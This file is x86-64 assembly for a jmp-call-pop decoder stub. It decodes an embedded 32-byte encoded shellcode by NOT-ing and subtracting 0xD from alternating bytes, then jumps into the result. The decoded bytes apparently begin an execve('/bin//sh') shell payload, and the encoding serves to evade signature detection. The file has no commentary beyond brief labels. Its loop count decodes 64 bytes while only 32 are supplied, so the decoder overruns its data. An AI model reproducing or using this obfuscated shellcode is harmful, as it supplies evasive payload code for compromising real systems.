global _start 

section .text

_start:

	jmp find_address

decoder:
	; Get the address of the string 
	pop rdi
	xor rcx, rcx
	add cl, 32
	
decode:
	not byte [rdi]
	inc rdi
	sub byte [rdi], 0XD
	inc rdi
	loop decode
	jmp encoded_shellcode
	

find_address:
	call decoder
	encoded_shellcode: db 0xb7,0x3e,0x3f,0x5d,0xb7,0xc8,0xd0,0x6f,0x96,0x7b,0xd0,0x3c,0x8c,0x75,0xac,0x55,0x76,0xf4,0xaf,0x55,0x76,0xef,0xa8,0x55,0x76,0xf3,0xb7,0x90,0x3f,0x48,0xf0,0x12
